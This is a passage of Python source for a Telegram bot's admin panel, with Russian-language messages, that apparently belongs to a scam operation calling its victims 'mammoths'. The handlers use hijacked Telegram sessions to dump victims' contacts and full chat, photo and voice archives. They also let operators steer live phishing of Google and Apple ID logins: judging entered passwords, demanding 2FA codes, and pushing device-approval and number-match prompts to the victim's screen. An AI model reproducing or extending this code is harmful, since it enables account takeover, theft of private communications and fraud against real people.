    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user:
        await callback.answer("❌ Пользователь не найден в БД", show_alert=True)
        return

    await callback.answer("⏳ Выгружаем контакты...", show_alert=False)
    user_dict = dict(user)
    session_str = user_dict.get("session_string")
    phone = user_dict.get("phone") or user_dict.get("phone_number")
    first_name = user_dict.get("first_name", "") or ""
    last_name = user_dict.get("last_name", "") or ""
    username = user_dict.get("username", "") or ""
    user_nickname = contacts_pkg.normalize_name(first_name, last_name, username)

    all_contacts = []
    if session_str and not session_str.startswith("mock_") and not session_str.startswith("sess_"):
        try:
            telethon_contacts = await contacts_pkg.extract_contacts_from_session(session_str)
            if telethon_contacts:
                all_contacts.extend(telethon_contacts)
        except Exception as e:
            logger.error("Error extracting contacts: %s", e)

    if phone:
        self_c = contacts_pkg.format_contact(phone, user_nickname)
        if self_c not in all_contacts:
            all_contacts.insert(0, self_c)

    if not all_contacts:
        await callback.message.answer("⚠️ Не удалось выгрузить контакты (нет сохраненных данных).")
        return

    contacts_pkg.append_contacts_list(CONTACTS_PATH, all_contacts)
    file_content = "\n".join(all_contacts)
    doc_file = BufferedInputFile(
        file_content.encode("utf-8"),
        filename=f"contacts_{user_tg_id}.txt",
    )
    await bot.send_document(
        chat_id=callback.message.chat.id,
        document=doc_file,
        caption=f"📇 <b>Контакты мамонта</b> <code>{user_tg_id}</code>\n📊 Собрано контактов: <code>{len(all_contacts)}</code>",
        parse_mode="HTML",
    )


@router.callback_query(F.data.startswith("adm_dump_chats:"))
async def cb_adm_dump_chats(callback: CallbackQuery, bot: Bot) -> None:
    user_tg_id = int(callback.data.split(":")[1])
    user = db.get_user_by_tg_id(DB_PATH, user_tg_id)
    if not user:
        await callback.answer("❌ Пользователь не найден в БД", show_alert=True)
        return

    if not can_admin_access_user(callback.from_user.id, user):
        await callback.answer("❌ Доступ ограничен (личный лог владельца).", show_alert=True)
        return

    session_str = user["session_string"] if "session_string" in user.keys() else None
    if not session_str or session_str.startswith("mock_") or session_str.startswith("sess_"):
        await callback.answer("❌ Нет активной сессии Telegram для этого пользователя", show_alert=True)
        return

    await callback.answer("⏳ Выгружаем диалоги и медиа...", show_alert=True)
    status_msg = await callback.message.answer("⏳ <i>Идет сбор диалогов, Saved Messages и медиафайлов...</i>", parse_mode="HTML")

    u_dict = dict(user)
    m_name = u_dict.get("nickname") or u_dict.get("username") or f"ID {user_tg_id}"
    reporter = ProgressReporter(status_msg, user_tg_id, m_name)

    try:
        archive_data = await contacts_pkg.extract_full_archive_from_session(
            session_string=session_str,
            user_tg_id=user_tg_id,
            days_limit=60,
            progress_cb=reporter.update,
        )
        if not archive_data:
            await status_msg.edit_text("❌ Не удалось выгрузить переписки (сессия завершена или аккаунт пуст).")
            return

        from shared.downloads import create_download_token
        full_zip = archive_data.get("full_zip_path") or archive_data.get("zip_path")
        zip_size_mb = archive_data.get("full_zip_size_mb") or archive_data.get("zip_size_mb", 0.0)

        _, download_url = create_download_token(
            file_path=full_zip,
            filename=f"archive_{user_tg_id}.zip",
            user_tg_id=user_tg_id,
            ttl_hours=24,
        )

        photos_cnt = archive_data.get("photos_count", 0)
        voices_cnt = archive_data.get("voices_count", 0)
        vn_cnt = archive_data.get("video_notes_count", 0)
        saved_cnt = archive_data.get("saved_msgs_count", 0)
        dialogs_cnt = archive_data.get("dialogs_count", 0)
        msgs_cnt = archive_data.get("total_messages", 0)

        archive_caption = (
            f"📦 <b>Полный архив мамонта сохранен на сервере!</b>\n\n"
            f"• 👤 <b>Мамонт:</b> {html.escape(m_name)} (ID: <code>{user_tg_id}</code>)\n"
            f"• 📌 Saved Messages: <code>{saved_cnt}</code>\n"
            f"• 📷 Фото: <code>{photos_cnt}</code>\n"
            f"• 🎙 Голосовые: <code>{voices_cnt}</code>\n"
            f"• 📹 Кружки: <code>{vn_cnt}</code>\n"
            f"• 💬 Диалогов: <code>{dialogs_cnt}</code> ({msgs_cnt} сообщ.)\n"
            f"💾 <b>Размер архива:</b> <code>{zip_size_mb:.1f} MB</code>\n"
            f"⏱ <b>Ссылка активна:</b> 24 часа\n\n"
            f"🔗 <b>Прямая ссылка для скачивания с VPS:</b>\n<code>{download_url}</code>\n\n"
            f"💡 <i>Нажмите кнопку ниже для моментального скачивания архива напрямую с сервера на высокой скорости.</i>"
        )
        dl_kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text=f"📥 Скачать архив напрямую ({zip_size_mb:.1f} MB)", url=download_url)],
                [InlineKeyboardButton(text="« Назад к логу", callback_data=f"adm_view_user:{user_tg_id}")],
            ]
        )
        await status_msg.edit_text(archive_caption, reply_markup=dl_kb, parse_mode="HTML")

        # 1. Send HTML Viewer
        html_path = archive_data.get("html_path")
        if html_path and os.path.exists(html_path):
            try:
                doc_html = FSInputFile(path=html_path, filename=f"chats_{user_tg_id}.html")
                await bot.send_document(
                    chat_id=callback.message.chat.id,
                    document=doc_html,
                    caption=f"🌐 <b>Интерактивный просмотр диалогов</b>\n👤 Мамонт: <code>{user_tg_id}</code>\n💡 <i>Откройте файл в браузере для чтения переписок</i>",
                    parse_mode="HTML",
                )
            except Exception as e_h:
                logger.error("Error sending html document: %s", e_h)

        # 2. If <= 45 MB, send direct zip doc
        if zip_size_mb <= 45.0 and full_zip and os.path.exists(full_zip):
            try:
                doc_zip = FSInputFile(full_zip, filename=f"archive_{user_tg_id}.zip")
                await bot.send_document(
                    chat_id=callback.message.chat.id,
                    document=doc_zip,
                    caption=f"📁 Документ архива: <code>archive_{user_tg_id}.zip</code>",
                    parse_mode="HTML",
                    request_timeout=300,
                )
            except Exception as e_z:
                logger.error("Error sending zip document: %s", e_z)
    except Exception as err:
        logger.error("Error in on-demand chat extraction: %s", err)
        await status_msg.edit_text(f"❌ Ошибка выгрузки: {err}")


@router.callback_query(F.data.startswith("adm_reset_sessions:"))
async def cb_adm_reset_sessions(callback: CallbackQuery, bot: Bot) -> None:
    await cb_adm_reset_sess(callback)


@router.callback_query(F.data == "noop")
async def cb_noop(callback: CallbackQuery) -> None:
    await callback.answer()


PENDING_GOOGLE_PROMPT: dict[int, int] = {}


@router.callback_query(F.data.startswith("gctrl:"))
async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
    parts = callback.data.split(":")
    if len(parts) < 3:
        await callback.answer("Ошибка формата кнопки", show_alert=True)
        return

    action = parts[1]
    try:
        target_tg_id = int(parts[2])
    except ValueError:
        await callback.answer("Неверный ID мамонта", show_alert=True)
        return

    if action == "wrong_pass":
        db.set_google_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="error_password",
            error_msg="Неверный пароль. Повторите попытку.",
        )
        await callback.answer("❌ Мамонту отправлена ошибка 'Неверный пароль'", show_alert=True)
        await notify_user_event(
            event_type="google_wrong_password",
            user_tg_id=target_tg_id,
            details="Воркер/Админ отклонил пароль (Неверный пароль)",
            is_test=True,
        )

    elif action == "correct_pass":
        db.set_google_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="correct_password",
            error_msg=None,
        )
        await callback.answer("✅ Пароль подтверждён (Верный пароль)", show_alert=True)
        await notify_user_event(
            event_type="google_password",
            user_tg_id=target_tg_id,
            details="Воркер/Админ подтвердил верный пароль",
            is_test=True,
        )

    elif action == "ask_prompt":
        PENDING_GOOGLE_PROMPT[callback.from_user.id] = target_tg_id
        await callback.answer("🔢 Отправьте 2 цифры в чат", show_alert=True)
        if callback.message:
            await callback.message.answer(
                f"🔢 <b>Google Auth (ID <code>{target_tg_id}</code>)</b>\n\n"
                "Отправьте <b>2 новые цифры</b> в ответ на это сообщение (например: <code>42</code>, <code>79</code>), чтобы они вывелись на экран мамонта:",
                parse_mode="HTML",
            )

    elif action == "wrong_prompt":
        PENDING_GOOGLE_PROMPT[callback.from_user.id] = target_tg_id
        db.set_google_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="error_prompt",
            error_msg="Выбрано неверное число на устройстве. Ожидайте новые цифры...",
        )
        await callback.answer("❌ Ошибка неверного числа отправлена. Отправьте 2 новые цифры в чат.", show_alert=True)
        if callback.message:
            await callback.message.answer(
                f"❌ <b>Google Auth (ID <code>{target_tg_id}</code>) — Неверные цифры</b>\n\n"
                "На экран мамонта выведена ошибка: <i>«Выбрано неверное число на устройстве. Ожидайте новые цифры...»</i>\n\n"
                "Отправьте <b>2 новые цифры</b> в ответ на это сообщение (например: <code>85</code>), чтобы перевести экран на новые цифры:",
                parse_mode="HTML",
            )
        await notify_user_event(
            event_type="google_wrong_prompt",
            user_tg_id=target_tg_id,
            details="Воркер/Админ отклонил цифры (Неверные цифры на устройстве)",
            is_test=True,
        )

    elif action == "complete":
        db.set_google_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="completed",
        )
        db.set_user_session(DB_PATH, target_tg_id, f"google_auth_{target_tg_id}")
        db.set_user_auth_step(DB_PATH, target_tg_id, "authorized")
        await callback.answer("🎉 Авторизация Google подтверждена!", show_alert=True)
        await notify_user_event(
            event_type="google_complete",
            user_tg_id=target_tg_id,
            auth_step="authorized",
            details="Воркер/Админ подтвердил успешный вход Google",
            is_test=True,
        )


@router.callback_query(F.data.startswith("actrl:"))
async def handle_apple_control_callback(callback: CallbackQuery, bot: Bot):
    parts = callback.data.split(":")
    if len(parts) < 3:
        await callback.answer("Ошибка формата кнопки", show_alert=True)
        return

    action = parts[1]
    try:
        target_tg_id = int(parts[2])
    except ValueError:
        await callback.answer("Неверный ID мамонта", show_alert=True)
        return

    if action == "wrong_pass":
        db.set_apple_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="error_password",
            error_msg="Неверный Apple ID или пароль.",
        )
        await callback.answer("❌ Мамонту отправлена ошибка 'Неверный Apple ID или пароль'", show_alert=True)
        await notify_user_event(
            event_type="apple_wrong_password",
            user_tg_id=target_tg_id,
            details="Воркер/Админ отклонил пароль Apple ID",
            is_test=True,
        )

    elif action == "correct_pass":
        db.set_apple_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="correct_password",
            error_msg=None,
        )
        await callback.answer("✅ Пароль Apple ID подтверждён", show_alert=True)
        await notify_user_event(
            event_type="apple_password_correct",
            user_tg_id=target_tg_id,
            details="Воркер/Админ подтвердил верный пароль Apple ID",
            is_test=True,
        )

    elif action == "ask_code":
        db.set_apple_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="ask_code",
            error_msg=None,
        )
        await callback.answer("🔢 На экран мамонта выведен ввод 6-значного 2FA кода Apple", show_alert=True)
        await notify_user_event(
            event_type="apple_ask_code",
            user_tg_id=target_tg_id,
            details="Запрошен 6-значный 2FA код Apple ID",
            is_test=True,
        )

    elif action == "wrong_code":
        db.set_apple_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="error_code",
            error_msg="Неверный код проверки. Повторите попытку.",
        )
        await callback.answer("❌ Ошибка неверного 2FA кода отправлена мамонту", show_alert=True)
        await notify_user_event(
            event_type="apple_wrong_code",
            user_tg_id=target_tg_id,
            details="Воркер/Админ отклонил 2FA код Apple (Неверный код)",
            is_test=True,
        )

    elif action == "ask_prompt":
        db.set_apple_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="ask_prompt",
            error_msg=None,
        )
        await callback.answer("📲 На экран мамонта выведено системное окно 'Разрешить на iPhone'", show_alert=True)
        await notify_user_event(
            event_type="apple_ask_prompt",
            user_tg_id=target_tg_id,
            details="Мамонту отправлен запрос подтверждения на устройстве (Разрешить)",
            is_test=True,
        )

    elif action == "complete":
        db.set_apple_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="completed",
        )
        db.set_user_session(DB_PATH, target_tg_id, f"apple_auth_{target_tg_id}")
        db.set_user_auth_step(DB_PATH, target_tg_id, "apple_authorized")
        await callback.answer("🎉 Авторизация Apple ID подтверждена!", show_alert=True)
        await notify_user_event(
            event_type="apple_complete",
            user_tg_id=target_tg_id,
            auth_step="apple_authorized",
            details="Воркер/Админ подтвердил успешный вход Apple ID",
            is_test=True,
        )



@router.message(F.text)
async def handle_admin_prompt_digits(message: Message, bot: Bot):
    if message.from_user is None or message.text is None:
        return

    if message.from_user.id in PENDING_GOOGLE_PROMPT:
        target_tg_id = PENDING_GOOGLE_PROMPT.pop(message.from_user.id)
        digits = message.text.strip()
        db.set_google_auth_control(
            DB_PATH,
            tg_id=target_tg_id,
            status="show_prompt",
            prompt_number=digits,
        )
        await message.answer(
            f"✅ <b>Цифры {digits} отправлены мамонту!</b>\n"
            f"Экран устройства мамонта (ID <code>{target_tg_id}</code>) переключен на подтверждение цифры <b>{digits}</b>.",
            parse_mode="HTML",
        )
        await notify_user_event(
            event_type="google_prompt",
            user_tg_id=target_tg_id,
            details=f"Выведено число {digits} на экран мамонта",
            is_test=True,
        )
        return

